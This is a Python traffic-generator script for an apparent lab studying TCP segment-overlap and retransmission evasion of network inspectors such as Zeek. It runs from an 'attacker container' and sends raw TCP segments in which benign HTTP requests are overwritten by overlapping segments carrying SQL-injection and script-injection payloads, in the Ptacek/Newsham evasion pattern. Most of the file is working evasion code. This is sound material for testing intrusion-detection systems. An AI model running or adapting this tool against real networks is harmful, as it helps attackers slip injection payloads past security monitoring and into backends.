#!/usr/bin/env python3
"""
TRS Traffic Generator

Phase 1 cases (kernel-driven, real retransmits):
  baseline    Normal delivery, no impairments. Sanity check.
  loss        Sends via kernel; expects impair-{left,right} loss to be set on
              the middle so kernel retransmits trigger. Identical payload on
              wire and in app — useful to verify TCP_REXMIT logging only.

Phase 2 cases (raw-socket, controlled segments — the actual TRS primitives):
  overlap     Sends benign segment at seq=X, then an OVERLAPPING segment at
              seq=X with different (malicious) content. Inspector and backend
              may pick different bytes during reassembly.
  spurious    Sends payload normally, waits for ACK, then sends a duplicate
              segment with same seq+content (spurious retransmit). Tests
              whether inspector re-inspects already-ACKed duplicates.
  partial    Sends segment at seq=X with benign content, then a partial-
              overlap segment at seq=X+offset with different bytes spanning
              into the unsent range.

Network placement assumption: impairments live on the *middle* container
(see /usr/local/bin/impair-{left,right} there). This generator does NOT
touch tc / iptables on its own networking — except to install the kernel-RST
suppression rule required by RawTcpSession (auto-managed).

Run inside the attacker container. Requires NET_RAW + NET_ADMIN caps.
"""

from __future__ import annotations

import argparse
import socket
import sys
import time
from datetime import datetime, timezone

# Allow `python /app/generator.py` to find raw_tcp in the same dir
sys.path.insert(0, "/app")
from raw_tcp import RawTcpSession  # noqa: E402


TARGET_DEFAULT = "10.20.0.2:8080"


def log(msg: str) -> None:
    ts = datetime.now(timezone.utc).isoformat(timespec="milliseconds")
    print(f"[{ts}] [generator] {msg}", flush=True)


# === Payloads ===

def http_payload(path: str = "/api/v1/user?id=1", extra: bytes = b"") -> bytes:
    body = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: trs-lab.local\r\n"
        f"User-Agent: TRS-Generator/1.0\r\n"
        f"Accept: */*\r\n"
    ).encode("ascii")
    return body + extra + b"Content-Length: 0\r\n\r\n"


BENIGN = http_payload("/api/v1/user?id=1")
# Same length as BENIGN within the first overlap window — used as the "evil"
# overlap content. Length match is not required but keeps seq math obvious.
EVIL_OVERLAP = http_payload(
    "/api/v1/user?id=1'+OR+'1'='1",
    extra=b"X-Inject: <script>alert(1)</script>\r\n",
)


# === Case implementations ===

def case_baseline(target_ip: str, target_port: int) -> None:
    """Kernel TCP, normal delivery. The reference case."""
    log("baseline: kernel TCP, no impairments expected")
    with socket.create_connection((target_ip, target_port), timeout=10) as s:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.sendall(BENIGN)
        s.settimeout(2.0)
        try:
            while s.recv(4096):
                pass
        except socket.timeout:
            pass
    log(f"baseline: sent {len(BENIGN)} bytes via kernel")


def case_loss(target_ip: str, target_port: int) -> None:
    """
    Kernel TCP. Caller is expected to have set up impairment on the middle
    BEFORE running this case, e.g.:
        docker compose exec middle impair-right loss 8 10
    Triggers real kernel retransmits with identical payloads.
    """
    log("loss: kernel TCP — set impair-right on middle first for retransmits")
    case_baseline(target_ip, target_port)


def case_overlap(target_ip: str, target_port: int, delay: float = 0.0) -> None:
    """
    The TRS overlap primitive.

    Sends:
      1. Benign segment at seq=X  (BENIGN payload)
      2. Overlapping segment at seq=X with different content (EVIL_OVERLAP)

    Both segments cover the same seq range. The backend's TCP stack will keep
    the first one accepted; the inspector's reassembler may behave differently.
    Compare Zeek TCP_CONTENTS vs backend APPLICATION VIEW with analyze.py.
    """
    log("overlap: raw-socket — benign then overlapping evil at same seq")
    with RawTcpSession(target_ip, target_port) as s:
        log(f"  src_port={s.src_port} iss={s.iss:#x}")
        s.open(timeout=5.0)
        log("  handshake OK")

        # Send benign data; record the seq
        seq_used = s.send_data(BENIGN)
        log(f"  sent BENIGN ({len(BENIGN)} bytes) at seq={seq_used}")

        if delay > 0:
            time.sleep(delay)

        # Overlap: same seq, different content (truncated/padded to match length)
        evil = EVIL_OVERLAP
        if len(evil) > len(BENIGN):
            evil = evil[: len(BENIGN)]
        elif len(evil) < len(BENIGN):
            evil = evil + b"A" * (len(BENIGN) - len(evil))
        s.inject_at(seq_used, evil)
        log(f"  injected OVERLAP ({len(evil)} bytes) at same seq={seq_used}")

        # Let peer ACK / FIN if it wants to
        s.drain(duration=0.5)
        s.close(timeout=2.0)
    log("overlap: done")


def case_spurious(target_ip: str, target_port: int, count: int = 1, delay: float = 0.2) -> None:
    """
    Spurious retransmit primitive.

    Sends payload, lets it be ACKed by the backend, then re-sends the same
    segment (same seq, same content) `count` extra times. Tests whether the
    inspector re-inspects already-ACKed duplicates differently.
    """
    log(f"spurious: raw-socket — payload + {count} spurious dup(s)")
    with RawTcpSession(target_ip, target_port) as s:
        log(f"  src_port={s.src_port}")
        s.open(timeout=5.0)

        seq_used = s.send_data(BENIGN)
        log(f"  sent BENIGN ({len(BENIGN)} bytes) at seq={seq_used}")
        time.sleep(delay)
        s.drain(duration=0.2)

        for i in range(count):
            time.sleep(delay)
            s.inject_at(seq_used, BENIGN)
            log(f"  spurious dup #{i+1} at seq={seq_used}")

        s.drain(duration=0.5)
        s.close(timeout=2.0)
    log("spurious: done")


def case_partial(target_ip: str, target_port: int, offset: int = 8) -> None:
    """
    Partial-overlap primitive.

    Sends segment A: BENIGN at seq=X.
    Sends segment B at seq=X+offset with bytes that overwrite part of A
    AND extend beyond A's end. This is the classic Ptacek/Newsham overlap
    evasion shape adapted for TCP retransmits.
    """
    log(f"partial: raw-socket — segment + partial overlap at +{offset}")
    with RawTcpSession(target_ip, target_port) as s:
        s.open(timeout=5.0)

        seq_used = s.send_data(BENIGN)
        log(f"  sent BENIGN ({len(BENIGN)} bytes) at seq={seq_used}")

        evil_tail = b"\xff' OR 1=1 -- " + b"Z" * 20
        s.inject_at(seq_used + offset, evil_tail)
        log(f"  injected partial overlap ({len(evil_tail)} bytes) at seq={seq_used + offset}")

        s.drain(duration=0.5)
        s.close(timeout=2.0)
    log("partial: done")


# === CLI ===

CASES = {
    "baseline": case_baseline,
    "loss": case_loss,
    "overlap": case_overlap,
    "spurious": case_spurious,
    "partial": case_partial,
}


def main() -> int:
    p = argparse.ArgumentParser(description="TRS Lab Traffic Generator")
    p.add_argument("--target", default=TARGET_DEFAULT, help="host:port (default: %(default)s)")
    p.add_argument("--case", choices=list(CASES), default="baseline")
    p.add_argument("--count", type=int, default=1, help="How many iterations")
    p.add_argument("--gap", type=float, default=1.0, help="Seconds between iterations")
    p.add_argument("--overlap-delay", type=float, default=0.0,
                   help="Seconds between original and overlap segment (overlap case)")
    p.add_argument("--spurious-count", type=int, default=2,
                   help="How many spurious duplicates to send (spurious case)")
    p.add_argument("--partial-offset", type=int, default=8,
                   help="Byte offset of the partial overlap (partial case)")

    args = p.parse_args()

    host, port_s = args.target.split(":")
    port = int(port_s)

    log(f"Starting: case={args.case} target={host}:{port} count={args.count}")

    handler = CASES[args.case]
    for i in range(args.count):
        log(f"=== Iteration {i + 1}/{args.count} ===")
        try:
            if args.case == "overlap":
                handler(host, port, delay=args.overlap_delay)
            elif args.case == "spurious":
                handler(host, port, count=args.spurious_count)
            elif args.case == "partial":
                handler(host, port, offset=args.partial_offset)
            else:
                handler(host, port)
        except Exception as exc:
            log(f"ERROR in iteration {i + 1}: {exc!r}")
            return 1
        if i < args.count - 1:
            time.sleep(args.gap)

    log("All iterations complete. Check pcaps + backend logs.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
